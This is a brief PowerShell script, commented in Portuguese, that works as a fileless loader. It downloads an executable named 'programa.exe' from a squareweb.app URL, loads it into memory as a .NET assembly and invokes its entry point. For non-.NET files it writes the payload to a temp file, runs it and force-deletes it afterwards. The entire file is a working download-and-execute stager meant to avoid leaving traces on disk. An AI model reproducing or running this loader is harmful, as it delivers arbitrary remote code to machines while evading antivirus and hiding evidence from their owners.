# exec.ps1 - Executa direto da memória SEM salvar em disco
$url = "https://testedessamerda.squareweb.app/programa.exe"

# Baixa para memória e executa
$data = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content

# Converte para assembly e executa na memória
$assembly = [System.Reflection.Assembly]::Load($data)
$entryPoint = $assembly.EntryPoint

# Se for .NET, executa
if ($entryPoint) {
    $entryPoint.Invoke($null, (, [string[]] @()))
} else {
    # Se não for .NET, salva temporariamente mas deleta depois
    $tempFile = [System.IO.Path]::GetTempFileName() + ".exe"
    [System.IO.File]::WriteAllBytes($tempFile, $data)
    $process = Start-Process $tempFile -PassThru
    $process.WaitForExit()
    Remove-Item $tempFile -Force
}